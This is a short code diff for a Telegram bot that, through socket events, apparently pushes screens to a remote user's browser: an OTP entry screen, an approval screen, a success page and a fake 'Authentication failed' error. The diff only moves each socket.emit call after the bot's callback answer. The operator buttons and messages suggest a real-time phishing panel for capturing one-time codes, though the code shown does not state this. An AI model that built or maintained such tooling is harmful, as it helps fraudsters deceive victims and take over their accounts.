@@ -335,10 +335,10 @@ bot.on('callback_query', async (callbackQuery) => {
 
 
     case 'mark_complete': {
-    socket.emit('show-success-screen');
     await bot.answerCallbackQuery(callbackQuery.id, {
       text: '✅ Marked as complete! User sees success page.'
-    });
+    }); 
+    socket.emit('show-success-screen');
     await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
       chat_id: chatId,
       message_id: messageId
@@ -384,18 +384,18 @@ bot.on('callback_query', async (callbackQuery) => {
 
 
 case 'resend_otp': {
-  socket.emit('show-otp-screen');
   await bot.answerCallbackQuery(callbackQuery.id, {
     text: '✅ OTP screen sent again'
   });
+  socket.emit('show-otp-screen');
   break;
 }
 
 case 'resend_approve': {
-  socket.emit('show-approve-screen');
   await bot.answerCallbackQuery(callbackQuery.id, {
     text: '✅ Approve screen sent again'
   });
+  socket.emit('show-approve-screen');
   break;
 }
 
@@ -418,10 +418,10 @@ case 'resend_approve_number': {
 
     case 'reject': {
       // Reject session
-      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
       await bot.answerCallbackQuery(callbackQuery.id, {
         text: '❌ Session rejected'
       });
+      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
         chat_id: chatId,
         message_id: messageId
